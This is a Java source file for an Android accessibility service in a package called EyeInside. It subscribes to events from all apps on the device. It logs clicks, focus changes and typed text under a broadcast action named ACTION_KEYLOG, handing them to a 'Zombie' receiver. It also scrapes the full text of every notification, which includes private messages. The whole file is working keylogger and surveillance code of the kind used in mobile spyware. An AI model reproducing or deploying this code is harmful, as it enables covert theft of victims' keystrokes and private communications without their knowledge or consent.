package com.code4bones.EyeInside;

import com.code4bones.utils.NetLog;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.os.Parcelable;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.accessibility.AccessibilityEvent;
import android.widget.RemoteViews;
import android.widget.TextView;

public class EyeAccessService extends AccessibilityService {

	public EyeAccessService() {
		NetLog.v("ACC: Service()");
	}

	@Override
	public void onAccessibilityEvent(AccessibilityEvent event) {

		String packName = event.getPackageName().toString();
		boolean isEnabled = event.isEnabled();
		boolean isChecked = event.isChecked();
		boolean isPassword = event.isPassword();
		String text = event.getText().toString();
		int eventType = event.getEventType();
		String className = event.getClassName().toString();
		
		if ( (eventType & AccessibilityEvent.TYPE_VIEW_CLICKED) == AccessibilityEvent.TYPE_VIEW_CLICKED ) {
			Intent wakeup = new Intent();
			wakeup.setAction(Zombie_BroadcastReceiver.ACTION_KEYLOG);
			wakeup.putExtra("event",event);
			this.sendBroadcast(wakeup);
			//NetLog.v("%s : Clicked on %s [%s]",packName,className,text);
		} else if ( !isPassword && (eventType & AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ) {
			Intent wakeup = new Intent();
			wakeup.setAction(Zombie_BroadcastReceiver.ACTION_KEYLOG);
			wakeup.putExtra("event",event);
			this.sendBroadcast(wakeup);
		} else 	if ( (eventType & AccessibilityEvent.TYPE_VIEW_FOCUSED) == AccessibilityEvent.TYPE_VIEW_FOCUSED ) {
			Intent wakeup = new Intent();
			wakeup.setAction(Zombie_BroadcastReceiver.ACTION_KEYLOG);
			wakeup.putExtra("event",event);
			this.sendBroadcast(wakeup);
		} else 	if ( (eventType & AccessibilityEvent.TYPE_VIEW_SELECTED) == AccessibilityEvent.TYPE_VIEW_SELECTED ) {
			//NetLog.v("%s : Selected on %s [%s]",packName,className,text);
		} else 	if ( (eventType & AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED ) == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED ) {
			try {
				handleNotify(event);
				Intent wakeup = new Intent();
				wakeup.setAction(Zombie_BroadcastReceiver.ACTION_NOTIFY);
				wakeup.putExtra(Zombie_BroadcastReceiver.EXTRA_PACKAGE, packName);
				wakeup.putExtra(Zombie_BroadcastReceiver.EXTRA_TEXT, text);
				wakeup.putExtra(Zombie_BroadcastReceiver.EXTRA_ALLTEXT, mMessage);
				this.sendBroadcast(wakeup);
			} catch ( Exception e ) {
			}
		} 
		
	}

	private void handleNotify(AccessibilityEvent event) {
		Parcelable parcel = event.getParcelableData(); 
		if (  parcel == null )
			return;
		Notification not = (Notification)parcel;
		RemoteViews remoteView = not.contentView;
		if ( remoteView == null ) {
			NetLog.v("remove view is null");
			return;
		}
		//NetLog.v("RemoveView: %s",remoteView);	
		LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
		ViewGroup localView = (ViewGroup) inflater.inflate(remoteView.getLayoutId(), null);
		remoteView.reapply(/*getApplicationContext()*/this, localView);		
		//NetLog.v("localView: %s [%d]",localView,localView.getChildCount());
		mMessage = "";
		for ( int idx = 0; idx < localView.getChildCount();idx++ ) {
			ViewGroup ll = (ViewGroup)localView.getChildAt(idx);
			eachView(ll);
		}
		
	}
	
	public String mMessage = "";
	
	private void eachView(ViewGroup parent) {
		for ( int idx = 0; idx < parent.getChildCount();idx++ ) {
			View v = parent.getChildAt(idx);
			if ( v instanceof TextView ) {
				TextView view  = (TextView)v;
				String text = view.getText().toString();
				if ( mMessage.length() > 0)
					mMessage += "|";
				mMessage += text;
			}
		}
	}
	
	@Override
	public void onServiceConnected() {
		NetLog.v("ACC: Service Connected");
		initService();
	}	
	@Override
	public void onInterrupt() {
		NetLog.v("ACC: Interrupted");
	}
	
	public void initService() {
		AccessibilityServiceInfo info = new AccessibilityServiceInfo();
		// We are interested in all types of accessibility events.
		info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;// TYPE_VIEW_CLICKED;// TYPE_NOTIFICATION_STATE_CHANGED;
		// We want to provide specific type of feedback.
		info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;// | AccessibilityServiceInfo.FEEDBACK_HAPTIC | AccessibilityServiceInfo.FEEDBACK_VISUAL;
		// We want to receive events in a certain interval.
		info.notificationTimeout = 100;
		// We want to receive accessibility events only from certain packages.
		// only handle this package
		info.packageNames = null;//new String[] {};
	
		setServiceInfo(info);
	}

}
